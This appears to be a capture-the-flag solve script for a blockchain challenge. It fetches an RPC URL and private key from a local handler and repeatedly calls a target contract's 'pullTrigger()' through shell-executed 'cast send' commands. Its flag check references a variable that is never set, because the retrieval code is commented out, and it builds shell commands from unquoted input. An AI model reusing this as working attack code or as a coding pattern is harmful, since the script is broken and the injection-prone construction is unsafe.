#!/usr/bin/env python3
from os import system
from pwn import remote

HANDLER_PORT = 8002

def csend(contract: str, fn: str, *args):
    global rpc_url
    global pvk
    print(f"cast send {contract} '{fn}' {' '.join(args)} --rpc-url {rpc_url} --private-key {pvk}")
    system(
        f"cast send {contract} '{fn}' {' '.join(args)} --rpc-url {rpc_url} --private-key {pvk}"
    )


if __name__ == "__main__":
    connection_info = {}
    challHandler = ("0.0.0.0", HANDLER_PORT)

    # connect to challenge handler and get connection info
    with remote("0.0.0.0", HANDLER_PORT) as p:
        p.recvuntil(b"action? ")
        p.sendline(b"1")
        p.recvuntil(b"Here's your connection info:\n\n")
        data = p.recvall()
        
    lines = data.decode().split('\n')
    for line in lines:
        if line:
            print(line)
            key, value = line.strip().split(': ')
            connection_info[key] = value

    rpc_url = connection_info['RPC URL']
    pvk = connection_info['Player Private Key']
    setup = connection_info['Setup Contract']
    target = connection_info['Target Contract']

    while True:
        # try luck
        csend(target, "pullTrigger()") 

        # get flag
        #with remote("0.0.0.0", HANDLER_PORT) as p:
        #    p.recvuntil(b"action? ")
        #    p.sendline(b"3")
        #    flag = p.recvall().decode()

        if "HTB" in flag:
            print(f"\n\n[*] {flag}")
            break
